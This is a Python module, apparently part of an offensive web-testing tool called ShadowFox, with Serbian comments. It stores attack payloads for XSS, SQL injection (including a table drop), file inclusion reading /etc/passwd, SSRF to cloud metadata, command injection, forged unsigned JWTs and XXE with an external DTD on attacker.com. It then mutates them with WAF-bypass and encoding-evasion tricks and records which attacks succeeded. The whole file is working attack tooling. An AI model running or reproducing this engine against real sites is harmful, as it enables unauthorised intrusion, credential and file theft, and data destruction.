# shadowfox/agents/mutation_engine.py

import random
import re
import base64
import urllib.parse
import json
import hashlib
from typing import Dict, List, Any, Optional, Tuple
import itertools
from datetime import datetime
import logging

class MutationEngine:
    """
    Napredni MutationEngine koji generiše mutirane payload-e
    koristeći AI heuristiku i kontekstualnu analizu
    """
    
    def __init__(self, operator):
        self.operator = operator
        self.logger = logging.getLogger('MutationEngine')
        
        # Učitaj payload biblioteku iz baze
        self._load_payload_library()
        
        # AI heuristika za kontekstualno generisanje
        self.context_weights = {
            "form_based": 0.8,
            "url_based": 0.6,
            "header_based": 0.4,
            "cookie_based": 0.5,
            "random": 0.2
        }
        
        # Encoding tehnike
        self.encodings = [
            "url", "double_url", "html", "js", "unicode", 
            "base64", "hex", "octal", "mixed"
        ]
        
        # WAF bypass tehnike
        self.waf_bypass_techniques = [
            "case_variation", "comment_injection", "encoding_variation",
            "whitespace_manipulation", "concatenation", "null_byte"
        ]
        
        self.logger.info("MutationEngine inicijalizovan sa AI heuristikom")
    
    def _load_payload_library(self):
        """Učitava payload biblioteku iz baze i dodaje default payload-e ako ne postoje"""
        
        # Osnovni payload-i po tipovima
        self.base_payloads = {
            "XSS": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
                "'-alert('XSS')-'",
                "\"><script>alert('XSS')</script>",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "<script>alert(/XSS/)</script>",
                "<script>eval('alert(\"XSS\")')</script>"
            ],
            "SQLi": [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "'; DROP TABLE users;--",
                "' OR 'a'='a",
                "1' ORDER BY 1--",
                "1' UNION SELECT @@version--",
                "' AND 1=CONVERT(int, (SELECT @@version))--",
                "' WAITFOR DELAY '0:0:5'--"
            ],
            "LFI": [
                "../../../../etc/passwd",
                "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "/etc/passwd%00",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
                "/proc/self/environ",
                "/var/log/apache2/access.log",
                "expect://id"
            ],
            "SSRF": [
                "http://127.0.0.1:80",
                "http://localhost:22",
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd",
                "gopher://127.0.0.1:25/_MAIL",
                "http://[::1]:80/",
                "http://0x7f000001:80/",
                "http://2130706433:80/",
                "http://127.1:80/",
                "dict://127.0.0.1:11211/stats"
            ],
            "RCE": [
                "; id",
                "| id",
                "& id",
                "`id`",
                "$(id)",
                "; cat /etc/passwd",
                "| whoami",
                "&& id",
                "|| id",
                "; uname -a"
            ],
            "JWT": [
                "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0",
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ",
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0",
                "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.",
            ],
            "XXE": [
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % ext SYSTEM \"http://attacker.com/evil.dtd\"> %ext;]><root></root>",
            ]
        }
        
        # Pokušaj učitavanje iz baze, ili dodaj default
        try:
            existing_payloads = {}
            for payload_type in self.base_payloads.keys():
                existing_payloads[payload_type] = self.operator.get_payloads_by_type(payload_type)
            
            # Ako nema payload-a u bazi, dodaj default
            if not any(existing_payloads.values()):
                self._populate_default_payloads()
                
        except Exception as e:
            self.logger.error(f"Greška pri učitavanju payload biblioteke: {e}")
            self._populate_default_payloads()
    
    def _populate_default_payloads(self):
        """Dodaje default payload-e u bazu"""
        try:
            import sqlite3
            with sqlite3.connect(self.operator.shadowfox_db) as conn:
                for payload_type, payloads in self.base_payloads.items():
                    for payload in payloads:
                        conn.execute('''
                            INSERT OR IGNORE INTO payload_library 
                            (payload_type, payload, description, success_rate)
                            VALUES (?, ?, ?, ?)
                        ''', (payload_type, payload, f"Default {payload_type} payload", 0.5))
                        
            self.logger.info("Default payload biblioteka dodana u bazu")
        except Exception as e:
            self.logger.error(f"Greška pri dodavanju default payload-a: {e}")
    
    def generate_mutations(self, payload_type: str, context: Dict = None, 
                          mutation_count: int = 50) -> List[Dict]:
        """
        Glavna funkcija za generisanje mutacija
        Koristi AI heuristiku za kontekstualno generisanje
        """
        self.logger.info(f"Generišem {mutation_count} mutacija za {payload_type}")
        
        # Učitaj base payload-e za tip
        base_payloads = self.operator.get_payloads_by_type(payload_type)
        if not base_payloads:
            base_payloads = [{"payload": p} for p in self.base_payloads.get(payload_type, [])]
        
        mutations = []
        context = context or {}
        
        # Generišemo različite tipove mutacija
        for i in range(mutation_count):
            base_payload = random.choice(base_payloads)["payload"]
            
            # Biraj mutacionu strategiju na osnovu konteksta
            strategy = self._choose_mutation_strategy(context, payload_type)
            
            # Generiši mutaciju
            mutated = self._apply_mutation_strategy(base_payload, strategy, context)
            
            mutations.append({
                "original": base_payload,
                "mutated": mutated,
                "strategy": strategy,
                "context_score": self._calculate_context_score(mutated, context),
                "payload_type": payload_type,
                "created_at": datetime.now().isoformat()
            })
        
        # Sortiraj po context_score (najbolje prvi)
        mutations.sort(key=lambda x: x["context_score"], reverse=True)
        
        # Loguj generisanje
        self.operator.log_agent_action("MutationEngine", "mutations_generated", {
            "payload_type": payload_type,
            "count": len(mutations),
            "strategies_used": list(set(m["strategy"] for m in mutations))
        })
        
        return mutations
    
    def _choose_mutation_strategy(self, context: Dict, payload_type: str) -> str:
        """
        AI heuristika za biranje najbolje mutacione strategije
        na osnovu konteksta i tipa payload-a
        """
        strategies = []
        
        # Kontekstualne strategije
        if context.get("forms"):
            strategies.extend(["form_context", "parameter_pollution"] * 3)
        
        if context.get("technologies", {}).get("WordPress"):
            strategies.extend(["wordpress_specific", "php_tricks"] * 2)
        
        if context.get("headers", {}).get("missing_security"):
            strategies.extend(["header_injection", "bypass_basic_filters"] * 2)
        
        if "waf" in str(context).lower() or "cloudflare" in str(context).lower():
            strategies.extend(["waf_bypass", "encoding_evasion"] * 4)
        
        # Payload-specific strategije
        payload_strategies = {
            "XSS": ["dom_based", "attribute_based", "event_handler", "encoding_evasion"],
            "SQLi": ["union_based", "boolean_based", "time_based", "error_based"],
            "LFI": ["path_traversal", "null_byte", "wrapper_based", "encoding_bypass"],
            "SSRF": ["localhost_variations", "ip_encoding", "protocol_abuse"],
            "RCE": ["command_chaining", "environment_vars", "special_chars"]
        }
        
        strategies.extend(payload_strategies.get(payload_type, []))
        
        # Osnovne strategije ako nema konteksta
        if not strategies:
            strategies = ["basic_encoding", "case_variation", "whitespace_manipulation"]
        
        return random.choice(strategies)
    
    def _apply_mutation_strategy(self, payload: str, strategy: str, context: Dict) -> str:
        """
        Primenjuje specifičnu mutacionu strategiju na payload
        """
        try:
            if strategy == "form_context":
                return self._mutate_for_form_context(payload, context)
            elif strategy == "waf_bypass":
                return self._apply_waf_bypass(payload)
            elif strategy == "encoding_evasion":
                return self._apply_encoding_evasion(payload)
            elif strategy == "dom_based":
                return self._mutate_dom_based_xss(payload)
            elif strategy == "union_based":
                return self._mutate_union_sqli(payload)
            elif strategy == "path_traversal":
                return self._mutate_path_traversal(payload)
            elif strategy == "localhost_variations":
                return self._mutate_localhost_variations(payload)
            elif strategy == "command_chaining":
                return self._mutate_command_chaining(payload)
            elif strategy == "parameter_pollution":
                return self._mutate_parameter_pollution(payload)
            elif strategy == "case_variation":
                return self._apply_case_variation(payload)
            elif strategy == "whitespace_manipulation":
                return self._apply_whitespace_manipulation(payload)
            elif strategy == "wordpress_specific":
                return self._mutate_wordpress_specific(payload)
            else:
                # Default: kombinacija osnovnih tehnika
                return self._apply_random_mutations(payload)
                
        except Exception as e:
            self.logger.error(f"Greška u mutaciji {strategy}: {e}")
            return payload
    
    def _mutate_for_form_context(self, payload: str, context: Dict) -> str:
        """Prilagođava payload za forme"""
        forms = context.get("forms", [])
        if not forms:
            return payload
        
        form = random.choice(forms)
        inputs = form.get("inputs", [])
        
        if inputs:
            input_field = random.choice(inputs)
            input_type = input_field.get("type", "text").lower()
            
            if input_type == "email":
                return f"test@evil.com\"><script>alert('XSS')</script>"
            elif input_type == "password":
                return f"password'||'1'='1"
            elif input_type == "hidden":
                return f"{payload}<!--hidden field injection-->"
            else:
                return f"\"{payload}\""
        
        return payload
    
    def _apply_waf_bypass(self, payload: str) -> str:
        """Primenjuje WAF bypass tehnike"""
        techniques = [
            lambda p: p.replace("script", "scr<>ipt"),
            lambda p: p.replace("alert", "al\\u0065rt"),
            lambda p: p.replace("'", "\\'").replace('"', '\\"'),
            lambda p: p.replace(" ", "/**/"),
            lambda p: p.replace("=", "/**/=/**/"),
            lambda p: p.replace("union", "/*!50000union*/"),
            lambda p: p.replace("select", "sel/**/ect"),
            lambda p: re.sub(r'(\w)', lambda m: f"\\u{ord(m.group(1)):04x}", p[:5]) + p[5:],
            lambda p: p.replace("<", "&lt;").replace(">", "&gt;") + "<!-- WAF bypass -->"
        ]
        
        technique = random.choice(techniques)
        return technique(payload)
    
    def _apply_encoding_evasion(self, payload: str) -> str:
        """Primenjuje različite encoding tehnike"""
        encoding_type = random.choice(self.encodings)
        
        if encoding_type == "url":
            return urllib.parse.quote(payload)
        elif encoding_type == "double_url":
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding_type == "html":
            return "".join(f"&#{ord(c)};" for c in payload)
        elif encoding_type == "js":
            return "".join(f"\\u{ord(c):04x}" for c in payload)
        elif encoding_type == "unicode":
            return "".join(f"\\u{ord(c):04x}" if ord(c) > 127 else c for c in payload)
        elif encoding_type == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif encoding_type == "hex":
            return "".join(f"\\x{ord(c):02x}" for c in payload)
        elif encoding_type == "octal":
            return "".join(f"\\{ord(c):03o}" for c in payload)
        elif encoding_type == "mixed":
            # Kombinacija različitih encoding-a
            result = payload
            for _ in range(random.randint(1, 3)):
                encoding = random.choice(["url", "html", "js"])
                if encoding == "url":
                    result = urllib.parse.quote(result, safe='')
                elif encoding == "html":
                    result = "".join(f"&#x{ord(c):x};" if random.random() > 0.5 else c for c in result)
        
        return result
    
    def _mutate_dom_based_xss(self, payload: str) -> str:
        """Specifične mutacije za DOM-based XSS"""
        dom_vectors = [
            f"javascript:eval('{payload}')",
            f"data:text/html,<script>{payload}</script>",
            f"#<img src=x onerror={payload}>",
            f"?search=<svg onload={payload}>",
            f"javascript:void(eval('{payload}'))"
        ]
        return random.choice(dom_vectors)
    
    def _mutate_union_sqli(self, payload: str) -> str:
        """Specifične mutacije za UNION SQL injection"""
        if "union" not in payload.lower():
            return payload
        
        variations = [
            payload.replace("UNION", "/*!50000UNION*/"),
            payload.replace("SELECT", "/*!50000SELECT*/"),
            payload.replace(" ", "/**/"),
            payload.replace("union select", "union all select"),
            payload + f" LIMIT {random.randint(1, 10)}",
            payload.replace("NULL", f"'{random.randint(1, 999)}'")
        ]
        return random.choice(variations)
    
    def _mutate_path_traversal(self, payload: str) -> str:
        """Mutacije za path traversal payload-e"""
        if "../" not in payload and "..\\" not in payload:
            return payload
        
        variations = [
            payload.replace("../", "....//"),
            payload.replace("../", "%2e%2e%2f"),
            payload.replace("../", "..\\"),
            payload + "%00",
            payload.replace("/", "\\"),
            "file://" + payload
        ]
        return random.choice(variations)
    
    def _mutate_localhost_variations(self, payload: str) -> str:
        """Mutacije za localhost/SSRF payload-e"""
        if "127.0.0.1" in payload or "localhost" in payload:
            variations = [
                payload.replace("127.0.0.1", "127.1"),
                payload.replace("127.0.0.1", "0x7f000001"),
                payload.replace("127.0.0.1", "2130706433"),
                payload.replace("localhost", "127.0.0.1"),
                payload.replace("localhost", "[::1]"),
                payload.replace("http://", "file://"),
                payload.replace("http://", "gopher://")
            ]
            return random.choice(variations)
        return payload
    
    def _mutate_command_chaining(self, payload: str) -> str:
        """Mutacije za RCE payload-e"""
        command_separators = [";", "|", "&", "&&", "||", "`", "$()"]
        commands = ["id", "whoami", "uname -a", "pwd", "ls"]
        
        separator = random.choice(command_separators)
        command = random.choice(commands)
        
        if separator in ["`", "$()"]:
            if separator == "`":
                return f"{payload}`{command}`"
            else:
                return f"{payload}$({command})"
        else:
            return f"{payload} {separator} {command}"
    
    def _mutate_parameter_pollution(self, payload: str) -> str:
        """HTTP Parameter Pollution mutacije"""
        return f"{payload}&param={payload}&param2={payload}"
    
    def _apply_case_variation(self, payload: str) -> str:
        """Varijacije u velikim/malim slovima"""
        variations = [
            payload.upper(),
            payload.lower(),
            "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)),
            "".join(c.lower() if c.isalpha() and random.random() > 0.5 else c for c in payload)
        ]
        return random.choice(variations)
    
    def _apply_whitespace_manipulation(self, payload: str) -> str:
        """Manipulacija whitespace karaktera"""
        whitespace_chars = [" ", "\t", "\n", "\r", "\f", "\v", "/**/", "%20", "%09"]
        
        # Zameni space karaktere
        for ws in [" ", "\t"]:
            if ws in payload:
                new_ws = random.choice(whitespace_chars)
                payload = payload.replace(ws, new_ws)
        
        return payload
    
    def _mutate_wordpress_specific(self, payload: str) -> str:
        """WordPress specifične mutacije"""
        wp_specific = [
            f"{payload}?wp-debug=1",
            f"/wp-admin/{payload}",
            f"/wp-content/themes/{payload}",
            f"{payload}&wp_customize=on",
            f"wp-json/wp/v2/{payload}"
        ]
        return random.choice(wp_specific)
    
    def _apply_random_mutations(self, payload: str) -> str:
        """Nasumične kombinacije osnovnih mutacija"""
        mutations = [
            self._apply_case_variation,
            self._apply_whitespace_manipulation,
            lambda p: self._apply_encoding_evasion(p),
            lambda p: self._apply_waf_bypass(p)
        ]
        
        # Primeni 1-3 nasumične mutacije
        num_mutations = random.randint(1, 3)
        result = payload
        
        for _ in range(num_mutations):
            mutation = random.choice(mutations)
            result = mutation(result)
        
        return result
    
    def _calculate_context_score(self, payload: str, context: Dict) -> float:
        """
        AI scoring algoritam koji ocenjuje koliko je payload
        prilagođen konkretnom kontekstu
        """
        score = 0.0
        
        # Bonus za forme
        if context.get("forms") and any(tag in payload.lower() for tag in ["input", "form", "\""]):
            score += 0.3
        
        # Bonus za poznate tehnologije
        technologies = context.get("technologies", {})
        if "WordPress" in technologies and "wp" in payload.lower():
            score += 0.2
        if "PHP" in technologies and ("php" in payload.lower() or "<?php" in payload):
            score += 0.2
        
        # Bonus za missing security headers
        missing_security = context.get("headers", {}).get("missing_security", [])
        if "x-frame-options" in missing_security and "frame" in payload.lower():
            score += 0.15
        if "content-security-policy" in missing_security and "script" in payload.lower():
            score += 0.15
        
        # Encoding complexity bonus
        if any(enc in payload for enc in ["%", "&#", "\\u", "\\x"]):
            score += 0.1
        
        # Length penalty (previše dugačak payload)
        if len(payload) > 200:
            score -= 0.1
        
        # WAF bypass indicators
        waf_indicators = ["/**/", "<>", "\\u", "&#x"]
        waf_score = sum(0.05 for indicator in waf_indicators if indicator in payload)
        score += min(waf_score, 0.2)
        
        return min(score, 1.0)  # Max score je 1.0
    
    def learn_from_success(self, payload: str, payload_type: str, success_rate: float):
        """
        Machine learning komponenta - uči iz uspešnih payload-a
        """
        try:
            import sqlite3
            with sqlite3.connect(self.operator.shadowfox_db) as conn:
                # Ažuriraj success_rate za slične payload-e
                conn.execute('''
                    UPDATE payload_library 
                    SET success_rate = (success_rate + ?) / 2
                    WHERE payload_type = ? AND payload = ?
                ''', (success_rate, payload_type, payload))
                
                # Dodaj novi uspešan payload ako ne postoji
                conn.execute('''
                    INSERT OR IGNORE INTO payload_library 
                    (payload_type, payload, description, success_rate)
                    VALUES (?, ?, ?, ?)
                ''', (payload_type, payload, f"Learned from successful attack", success_rate))
                
            self.operator.log_agent_action("MutationEngine", "learning_update", {
                "payload_type": payload_type,
                "success_rate": success_rate,
                "payload_length": len(payload)
            })
            
        except Exception as e:
            self.logger.error(f"Greška pri učenju iz uspešnog payload-a: {e}")

# Test funkcionalnosti
if __name__ == "__main__":
    from operator import ShadowFoxOperator
    
    # Test inicijalizacije
    op = ShadowFoxOperator()
    mutation_engine = MutationEngine(op)
    
    # Test context
    test_context = {
        "forms": [{"inputs": [{"name": "search", "type": "text"}]}],
        "technologies": {"WordPress": True, "PHP": True},
        "headers": {"missing_security": ["x-frame-options", "content-security-policy"]}
    }
    
    # Generiši mutacije
    mutations = mutation_engine.generate_mutations("XSS", test_context, mutation_count=10)
    
    print("=== Generated XSS Mutations ===")
    for i, mutation in enumerate(mutations[:5]):
        print(f"\n{i+1}. Strategy: {mutation['strategy']}")
        print(f"   Score: {mutation['context_score']:.2f}")
        print(f"   Original: {mutation['original']}")
        print(f"   Mutated:  {mutation['mutated']}")
